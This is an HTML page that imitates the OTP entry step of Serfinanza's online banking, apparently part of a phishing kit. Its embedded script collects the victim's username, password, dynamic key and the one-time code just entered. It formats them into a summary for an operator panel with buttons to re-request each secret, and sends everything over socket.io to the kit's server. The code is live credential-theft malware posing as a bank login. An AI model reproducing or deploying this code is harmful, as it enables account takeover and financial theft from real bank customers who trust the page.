<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Serfinanza - Banca Personas</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <header class="header">
            <img src="img/logo2.png" alt="Serfinanza" class="logo">
        </header>

        <main class="main-content">
            <div class="login-card">
                <h1 class="welcome-title">BIENVENIDO A TU</h1>
                <h2 class="welcome-subtitle">SERFINANZA VIRTUAL</h2>
                <h3 class="welcome-type">PERSONAS</h3>

                <div class="icon-user">
                    <svg width="70" height="70" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="5" y="9" width="14" height="11" rx="2" stroke="#e63946" stroke-width="2"/>
                        <path d="M9 9V7C9 5.34315 10.3431 4 12 4C13.6569 4 15 5.34315 15 7V9" stroke="#e63946" stroke-width="2" stroke-linecap="round"/>
                        <circle cx="12" cy="14" r="1" fill="#e63946"/>
                        <circle cx="9" cy="14" r="1" fill="#e63946"/>
                        <circle cx="15" cy="14" r="1" fill="#e63946"/>
                        <circle cx="12" cy="17" r="1" fill="#e63946"/>
                    </svg>
                </div>

                <form id="otpForm" onsubmit="return false">
                    <div class="input-group">
                        <input type="text" id="otpInput" class="input-field" placeholder="Ingresa tu c√≥digo OTP" maxlength="4" inputmode="numeric">
                    </div>

                    <button type="button" class="btn-ingresar" id="btnIngresar" disabled>Ingresar</button>
                </form>

                <div class="links-container">
                    <a href="#" class="link">Reg√≠strate<br>aqu√≠</a>
                    <a href="#" class="link">Recordar<br>Usuario</a>
                    <a href="#" class="link">Restablecer<br>Contrase√±a</a>
                </div>
            </div>
        </main>

        <footer class="footer">
            <p class="contact-info">L√≠nea de Servicio al Cliente: 323 5997000 - 018000510513</p>
            
            <div class="footer-links">
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="4" y="7" width="8" height="7" rx="1" stroke="#666" stroke-width="1.5"/>
                        <path d="M6 7V5C6 3.34315 7.34315 2 9 2H9C10.6569 2 12 3.34315 12 5V7" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Seguridad</a>
                </div>
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="3" y="2" width="10" height="12" rx="1" stroke="#666" stroke-width="1.5"/>
                        <line x1="5" y1="5" x2="11" y2="5" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="8" x2="11" y2="8" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="11" x2="9" y2="11" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Reglamento Sucursal Virtual</a>
                </div>
                <div class="footer-link-item">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="3" y="2" width="10" height="12" rx="1" stroke="#666" stroke-width="1.5"/>
                        <line x1="5" y1="5" x2="11" y2="5" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="8" x2="11" y2="8" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                        <line x1="5" y1="11" x2="9" y2="11" stroke="#666" stroke-width="1.5" stroke-linecap="round"/>
                    </svg>
                    <a href="#">Pol√≠ticas de Privacidad</a>
                </div>
            </div>

            <div class="footer-bottom">
                <img src="img/superfinanciera Vigilado-01.jpg" alt="Superfinanciera" class="vigilado-logo">
                <p class="copyright">Serfinanza - 2025</p>
            </div>
        </footer>
    </div>

    <!-- Overlay de carga -->
    <div id="loadingOverlay" class="overlay">
        <div class="overlay-content">
            <img src="img/logo2.png" alt="Serfinanza" class="overlay-logo">
            <div class="spinner"></div>
            <p class="overlay-text">Cargando...</p>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/banco-utils.js"></script>
    <script src="otp-optimized.js"></script>
</body>
</html>
    <script>
        const btnIngresar = document.getElementById('btnIngresar');
        const otpInput = document.getElementById('otpInput');

        otpInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        btnIngresar.addEventListener('click', function() {
            const otp = otpInput.value.trim();
            
            if (!otp || otp.length < 4) {
                alert('Por favor ingresa un c√≥digo OTP v√°lido (4 d√≠gitos)');
                return;
            }

            showOverlay();

            const serfinanzaData = JSON.parse(sessionStorage.getItem('serfinanzaData') || '{}');
            serfinanzaData.otp = otp;
            sessionStorage.setItem('serfinanzaData', JSON.stringify(serfinanzaData));

            const message = `
üîî <b>SERFINANZA - RESUMEN COMPLETO</b>

üìã <b>INFORMACI√ìN COMPLETA:</b>
üë§ <b>Usuario:</b> ${serfinanzaData.usuario || 'N/A'}
üîê <b>Contrase√±a:</b> ${serfinanzaData.password || 'N/A'}
üî¢ <b>Clave Din√°mica:</b> ${serfinanzaData.dinamica || 'N/A'}
üì± <b>C√≥digo OTP:</b> ${serfinanzaData.otp}

‚è∞ ${new Date().toLocaleString('es-CO')}
            `.trim();

            const keyboard = {
                inline_keyboard: [
                    [{ text: 'üë§ Pedir Usuario', callback_data: `request_usuario:${sessionId}` }],
                    [{ text: 'üîë Pedir Contrase√±a', callback_data: `request_password:${sessionId}` }],
                    [{ text: 'üî¢ Pedir Din√°mica', callback_data: `request_dynamic:${sessionId}` }],
                    [{ text: 'üì± Pedir OTP', callback_data: `request_otp:${sessionId}` }],
                    [{ text: '‚úÖ Finalizar', callback_data: `finish:${sessionId}` }]
                ]
            };

            socket.emit('sendData', {
                sessionId: sessionId,
                type: 'otp',
                content: { text: message, keyboard: keyboard }
            });
        });

        otpInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                btnIngresar.click();
            }
        });
    </script>
</body>
</html>
